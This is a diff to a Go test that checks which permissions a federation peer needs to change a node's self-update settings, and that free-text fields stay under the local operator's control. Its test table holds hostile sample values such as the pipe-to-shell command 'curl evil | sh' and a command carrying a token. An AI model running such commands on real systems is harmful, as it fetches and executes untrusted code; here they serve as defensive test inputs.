@@ -285,10 +285,15 @@ func TestSelfUpdateSettingsFleetGrantsKeepFreeTextLocal(t *testing.T) {
 	require.Equal(t, "read", v.Access)
 	code, _ = call("PUT", schedule)
 	require.Equal(t, 403, code, "node.update cannot change settings")
+	_, err := db.DeleteFederationPeerGrant(fh.peer.id.ID(), agentd.PermNodeUpdate, "")
+	require.NoError(t, err)
+	grant(agentd.PermNodeUpdateSettings)
+	code, _ = call("PUT", schedule)
+	require.Equal(t, 403, code, "a change also needs node.update, which guards the returned view")
+	grant(agentd.PermNodeUpdate)
 
 	// When the peer holds node.update.settings, it changes the schedule;
 	// the withheld command it sent back empty is kept.
-	grant(agentd.PermNodeUpdateSettings)
 	code, v = call("PUT", schedule)
 	require.Equal(t, 200, code)
 	require.Equal(t, "settings", v.Access)
@@ -301,6 +306,9 @@ func TestSelfUpdateSettingsFleetGrantsKeepFreeTextLocal(t *testing.T) {
 	// opt-in stay with the node's own operator.
 	for name, settings := range map[string]map[string]any{
 		"command":     {"method": "custom", "custom": map[string]any{"command": "curl evil | sh"}},
+		"guess":       {"method": "custom", "custom": map[string]any{"command": "deploy --token s3cret"}},
+		"timeout":     {"method": "custom", "custom": map[string]any{"timeout_seconds": 60}},
+		"ref":         {"method": "custom", "source_checkout": map[string]any{"ref": "evil-branch"}},
 		"checkout":    {"method": "custom", "source_checkout": map[string]any{"path": "/tmp/evil"}},
 		"install dir": {"method": "custom", "install_dir": "/tmp/bin"},
 		"ack":         {"method": "custom", "package_manager_ack": true},
